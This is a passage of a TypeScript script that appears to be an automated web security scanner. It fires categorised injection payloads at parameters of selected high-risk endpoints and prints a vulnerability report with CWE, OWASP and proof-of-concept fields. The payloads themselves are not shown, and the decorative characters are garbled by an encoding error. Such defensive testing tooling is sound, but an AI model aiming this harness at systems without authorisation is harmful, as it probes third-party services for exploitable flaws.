     ep.path.includes('reclamation') || ep.path.includes('etablissement') || ep.path.includes('explorer'))
  ).slice(0, 30); // Top 30 high-risk

  let totalVulns = 0;
  
  for (const cat of categories) {
    console.log(`\n${C.bold}${C.cyan}â”â”â” [${cat.name}] Testing ${cat.payloads.length} payloads â”â”â”${C.reset}`);
    
    let catVulns = 0;
    for (const endpoint of highRiskEndpoints) {
      for (const param of endpoint.params.slice(0, 3)) { // Top 3 params per endpoint
        for (const payload of cat.payloads.slice(0, 2)) { // Top 2 payloads per category
          const result = await testEndpoint(endpoint, param, payload, cat.cat);
          results.push(result);
          
          if (result.vulnerable) {
            catVulns++;
            totalVulns++;
            console.log(`  ${C.red}âœ— [${result.severity}]${C.reset} ${result.endpoint} | ${param}`);
            console.log(`    ${C.yellow}â†’ ${result.evidence}${C.reset}`);
          }
          
          await new Promise(r => setTimeout(r, 5)); // Rate limiting
        }
      }
    }
    
    console.log(`  ${catVulns === 0 ? C.green + 'âœ“' : C.red + 'âœ—'} ${C.reset} ${catVulns} vulnerabilities`);
  }

  // Generate Report
  generateReport(totalVulns);
}

function generateReport(totalVulns: number) {
  const critical = results.filter(r => r.vulnerable && r.severity === 'CRITICAL').length;
  const high = results.filter(r => r.vulnerable && r.severity === 'HIGH').length;
  const medium = results.filter(r => r.vulnerable && r.severity === 'MEDIUM').length;
  const passRate = ((results.length - totalVulns) / results.length * 100).toFixed(1);

  console.log(`
${C.bold}${C.magenta}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                              FINAL SECURITY AUDIT REPORT                                          â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  Date: ${new Date().toISOString().padEnd(30)}                                               â•‘
â•‘  Total Tests: ${results.length.toString().padEnd(10)} | Pass Rate: ${passRate}%                                                   â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  ğŸ”´ CRITICAL: ${critical.toString().padEnd(5)} | ğŸŸ  HIGH: ${high.toString().padEnd(5)} | ğŸŸ¡ MEDIUM: ${medium.toString().padEnd(5)}                                       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C.reset}
`);

  if (totalVulns === 0) {
    console.log(`${C.bgGreen}${C.bold}  âœ… ALL SECURITY TESTS PASSED - APPLICATION IS SECURE  ${C.reset}\n`);
  } else {
    console.log(`${C.bgRed}${C.bold}  âš ï¸ ${totalVulns} VULNERABILITIES FOUND - IMMEDIATE ACTION REQUIRED  ${C.reset}\n`);
    
    // Show PoC for vulnerabilities
    const vulns = results.filter(r => r.vulnerable);
    console.log(`${C.bold}Proof of Concept (PoC):${C.reset}`);
    for (const v of vulns.slice(0, 10)) {
      console.log(`\n  [${v.severity}] ${v.category} - ${v.endpoint}`);
      console.log(`    ${C.dim}CWE: ${v.cweid} | OWASP: ${v.owasp}${C.reset}`);
      console.log(`    ${C.yellow}Evidence: ${v.evidence}${C.reset}`);
      if (v.poc) console.log(`    ${C.cyan}PoC: ${v.poc.substring(0, 100)}...${C.reset}`);
    }
  }

  // Category Summary
  console.log(`\n${C.bold}Category Summary:${C.reset}`);
  const categories = [...new Set(results.map(r => r.category))];
  for (const cat of categories) {
    const catResults = results.filter(r => r.category === cat);
    const catVulns = catResults.filter(r => r.vulnerable).length;
    const icon = catVulns > 0 ? `${C.red}âœ—${C.reset}` : `${C.green}âœ“${C.reset}`;
    console.log(`  ${icon} ${cat}: ${catResults.length - catVulns}/${catResults.length} passed`);
  }
  
  console.log(`\n${C.dim}Report generated at ${new Date().toLocaleString('fr-FR')}${C.reset}\n`);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// RUN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

runSecurityAudit().catch(console.error);
